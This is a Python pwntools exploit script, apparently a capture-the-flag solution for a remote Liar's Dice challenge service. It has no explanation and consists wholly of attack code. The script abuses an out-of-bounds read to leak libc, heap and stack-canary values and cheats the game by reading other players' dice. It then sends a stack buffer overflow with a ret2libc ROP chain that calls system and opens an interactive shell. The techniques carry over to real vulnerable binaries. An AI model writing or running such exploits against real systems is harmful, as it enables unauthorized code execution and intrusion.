from pwn import *

#proc = process("./liars")
proc = remote("liars.pwni.ng", 2018)

def oob_32(i):
  proc.recvuntil("Leave\n")
  proc.sendline("1")
  proc.recvuntil("? ")
  proc.sendline(str(i).replace('L', ''))
  ans = int(proc.recvline().strip().split()[2])
  if ans < 0:
    ans += 2**32
  return ans

def oob(i):
  print "Index:", hex(i)
  proc.recvuntil("Leave\n")
  proc.sendline("1")
  proc.recvuntil("? ")
  proc.sendline(str(i).replace('L', ''))
  ans = int(proc.recvline().strip().split()[2])
  if ans < 0:
    ans += 2**32
  part1 = ans

  proc.recvuntil("Leave\n")
  proc.sendline("1")
  proc.recvuntil("? ")
  proc.sendline(str(i + 1))
  ans = int(proc.recvline().strip().split()[2])
  if ans < 0:
    ans += 2**32
  part2 = ans
  return u64(p32(part1) + p32(part2))

def get_die():
  proc.recvuntil("Your dice:\n")
  die = []
  while True:
    start = proc.recvline().strip()
    if start == "":
      break
    count = 0
    while True:
      curr = proc.recvline().strip()
      if curr == "-----":
        break
      count += curr.count("o")
    die.append(count)
  return die

proc.recvuntil("? ")
proc.sendline("10")

libc_base = oob(-12) - 0x1ecf60
print "Libc", hex(libc_base)
oob_base = oob(-0x58) - 0x390 + 0x4a0
print "Oob Base", hex(oob_base)

canary = libc_base + 0x1f3568

leak_id = (canary - oob_base)/4
leak_id = -(2**63 - leak_id)

canary = oob(leak_id)
print "Canary", hex(canary)

proc.sendline("4")
proc.sendline("y")
proc.sendline("7")

for _ in range(1):
  print proc.recvuntil("New round")

  roll_cnts = [oob_32(-8 + i) for i in range(6)]
  print roll_cnts
  proc.sendline("2")
  proc.recvuntil("switch with? ")
  proc.sendline("6")

  proc.sendline("0")

  proc.sendline("1")

  proc.recvuntil("Player 5's turn\n")
  last_bet = proc.recvline().strip().split()
  last_bet_face = int(last_bet[2].rstrip('s'))
  last_bet_num = int(last_bet[1])

  if roll_cnts[last_bet_face - 1] == last_bet_num:
    proc.recvuntil("Leave\n")
    proc.sendline("2")
  else:
    print("FAIL")
    exit(0)

for _ in range(8):
  print proc.recvuntil("New round")

  roll_cnts = [oob_32(-8 + i) for i in range(6)]
  print roll_cnts

  proc.sendline("0")

  die = get_die()

  for x in die[5:]:
    roll_cnts[x - 1] -= 1

  face = -1
  num = -1
  for x in range(6):
    if roll_cnts[x] > 6:
      face = x + 1
      num = roll_cnts[x] - 6
      break
  assert face != -1
  proc.recvuntil("face? ")
  proc.sendline(str(face))
  proc.recvuntil("dice? ")
  proc.sendline(str(num))

  proc.recvuntil("Leave\n")
  proc.sendline("2")

counter = 0
num_p = 6

for _ in range(30):
  print proc.recvuntil("New round")

  roll_cnts = [oob_32(-8 + i) for i in range(6)]
  print roll_cnts
  proc.sendline("2")
  proc.recvuntil("switch with? ")
  proc.sendline("6")

  proc.sendline("0")

  fucked = get_die()[5:]
  face = -1
  num = -1
  for x in range(6):
    if roll_cnts[x] > num_p and (x+1) in fucked:
      face = x + 1
      num = roll_cnts[x] - num_p
      break
  assert face != -1
  proc.recvuntil("face? ")
  proc.sendline(str(face))
  proc.recvuntil("dice? ")
  proc.sendline(str(num))

  proc.recvuntil("Leave\n")
  proc.sendline("1")
  counter += 1
  if counter % 5 == 0:
    num_p -= 1

pop_rdi = libc_base + 0x0000000000026b72

payload = "A" * 520
payload += p64(canary)
payload += p64(0)
payload += p64(pop_rdi)
payload += p64(libc_base + 0x1b75aa)
payload += p64(libc_base + 0x0000000000025679)
payload += p64(libc_base + 0x55410)

proc.sendline(payload)

proc.interactive()

